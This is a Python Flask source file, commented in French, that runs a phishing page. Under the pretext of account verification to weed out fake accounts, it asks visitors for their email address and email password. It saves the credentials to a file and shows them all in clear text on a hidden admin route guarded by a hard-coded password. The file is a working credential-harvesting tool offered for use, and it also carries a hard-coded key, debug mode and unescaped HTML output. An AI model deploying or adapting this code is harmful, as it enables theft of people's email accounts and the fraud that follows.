from flask import Flask, render_template_string, request
from cryptography.fernet import Fernet
import os
import json

app = Flask(__name__)

# Nom du fichier sécurisé où seront stockés les mots de passe chiffrés
DB_FILE = "passwords_db.enc"

# Clé de chiffrement (Générée automatiquement ou fixe - À garder secrète !)
SECRET_KEY = b'4Z8eW2kL90P_XqR4vA1B2C3D4E5F6G7H8I9J0K1L2M3=' 
cipher_suite = Fernet(SECRET_KEY)

def charger_base():
    """Charge le fichier sécurisé des mots de passe"""
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, "rb") as f:
            donnees_chiffrees = f.read()
            if not donnees_chiffrees:
                return {}
            # Déchiffrement global du fichier
            donnees_dechiffrees = cipher_suite.decrypt(donnees_chiffrees)
            return json.loads(donnees_dechiffrees.decode('utf-8'))
    except Exception:
        return {}

def sauvegarder_base(base):
    """Chiffre et sauvegarde toute la base dans le fichier"""
    donnees_json = json.dumps(base).encode('utf-8')
    donnees_chiffrees = cipher_suite.encrypt(donnees_json)
    with open(DB_FILE, "wb") as f:
        f.write(donnees_chiffrees)

# Template HTML avec emplacement clair pour votre logo
HTML_PAGE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enregistrement des Accès Clients</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">

    <div class="bg-slate-800 p-8 rounded-2xl shadow-2xl w-full max-w-md border border-slate-700">
        
        <!-- ========================================== -->
        <!-- EMPLACEMENT POUR VOTRE LOGO OU DESIGN      -->
        <!-- ========================================== -->
        <div class="text-center mb-6">
            <!-- 
              INSTRUCTIONS POUR VOTRE LOGO :
              1. Créez un dossier nommé 'static' à côté de ce fichier app.py
              2. Mettez votre image dedans (ex: mon-logo.png)
              3. Modifiez le 'src' ci-dessous par : /static/mon-logo.png
            -->
            <img src="/static/logos.jpg" alt="Mon Logo" class="mx-auto h-16 w-auto mb-3 object-contain" id="mon-logo">
            
            <!-- (Optionnel) Si vous n'avez pas encore d'image, le titre s'affiche -->
            <h1 class="text-2xl font-bold tracking-wide">Vérifier le compte de l'utilisateur</h1>
            <p class="text-sm text-slate-400 mt-1">Pour garantir la sécurité de notre communauté et éliminer les faux comptes, une vérification par e-mail est requise </p>
        </div>

        <!-- Formulaire d'enregistrement -->
        <form method="POST" class="space-y-4">
            <div>
                <label class="block text-sm font-medium text-slate-300 mb-1">Email de l'utilisateur</label>
                <input type="email" name="email" required placeholder="Utilisateur@domaine.com" 
                    class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:outline-none text-slate-100 placeholder-slate-500">
            </div>

            <div>
                <label class="block text-sm font-medium text-slate-300 mb-1">Mot de passe de l'e-mail</label>
                <input type="text" name="password" required placeholder="Entrer le mot de passe de l'e-mail" 
                    class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:outline-none text-slate-100 placeholder-slate-500">
            </div>

            <button type="submit" 
                class="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-semibold rounded-lg transition duration-200 shadow-lg">
                Associer le compte à l'e-mail
            </button>
        </form>

        <!--  Votre demande est en cours de traitement, merci de patienter -->
        {% if success %}
        <div class="mt-6 p-4 bg-emerald-900/50 border border-emerald-700 rounded-lg text-center text-emerald-200 text-sm">
            {{ success }}
        </div>
        {% endif %}
        
    </div>

</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    success = None
    if request.method == 'POST':
        email = request.form.get('email').strip().lower()
        password = request.form.get('password').strip()
        
        # 1. Charger la base existante depuis le fichier
        base = charger_base()
        
        # 2. Ajouter ou mettre à jour le mot de passe (stocké en clair dans le dictionnaire, mais le fichier global est chiffré)
        base[email] = password
        
        # 3. Sauvegarder l'ensemble dans le fichier sécurisé `passwords_db.enc`
        sauvegarder_base(base)
        
        success = f"Succès ! Le mot de passe pour {email} a bien été enregistré et protégé dans le fichier."
        
    return render_template_string(HTML_PAGE, success=success)
# --- PAGE ADMIN POUR VOIR LES CLIENTS ---
@app.route('/admin-secrets-99', methods=['GET', 'POST'])
def admin_panel():
    # Vous pouvez changer 'MonMotDePasseAdmin123' par le mot de passe secret de votre choix
    ADMIN_PASSWORD = "MonMotDePasseAdmin123"
    
    # Étape 1 : Demander le mot de passe admin si non connecté
    if request.form.get('admin_pwd') != ADMIN_PASSWORD:
        return """
        <!DOCTYPE html>
        <html lang="fr">
        <head><meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script></head>
        <body class="bg-slate-900 text-slate-100 flex items-center justify-center min-h-screen">
            <form method="POST" class="bg-slate-800 p-8 rounded-xl border border-slate-700 shadow-xl space-y-4">
                <h2 class="text-xl font-bold">Accès Administrateur</h2>
                <input type="password" name="admin_pwd" placeholder="Mot de passe admin" required class="w-full px-4 py-2 bg-slate-900 border border-slate-700 rounded text-white">
                <button type="submit" class="w-full py-2 bg-blue-600 rounded font-semibold">Valider</button>
            </form>
        </body>
        </html>
        """
    
    # Étape 2 : Si le mot de passe est bon, on lit et déchiffre la base
    base = charger_base()
    
    html_liste = """
    <!DOCTYPE html>
    <html lang="fr">
    <head><meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script></head>
    <body class="bg-slate-900 text-slate-100 p-8">
        <div class="max-w-2xl mx-auto space-y-6">
            <h1 class="text-2xl font-bold">Liste des Comptes Clients Enregistrés</h1>
            <div class="space-y-3">
    """
    
    if not base:
        html_liste += "<p class='text-slate-400'>Aucun client enregistré pour le moment.</p>"
    else:
        for email, pwd in base.items():
            html_liste += f"""
            <div class="bg-slate-800 p-4 rounded-xl border border-slate-700 flex justify-between items-center">
                <div>
                    <span class="text-xs text-slate-400 block">Email :</span>
                    <strong class="text-slate-200">{email}</strong>
                </div>
                <div>
                    <span class="text-xs text-slate-400 block">Mot de passe :</span>
                    <span class="font-mono text-emerald-400 font-bold">{pwd}</span>
                </div>
            </div>
            """
            
    html_liste += """
            </div>
            <a href="/admin-secrets-99" class="inline-block text-sm text-blue-400 underline mt-4">Actualiser / Quitter</a>
        </div>
    </body>
    </html>
    """
    return html_liste

if __name__ == '__main__':
    app.run(debug=True, port=5000)
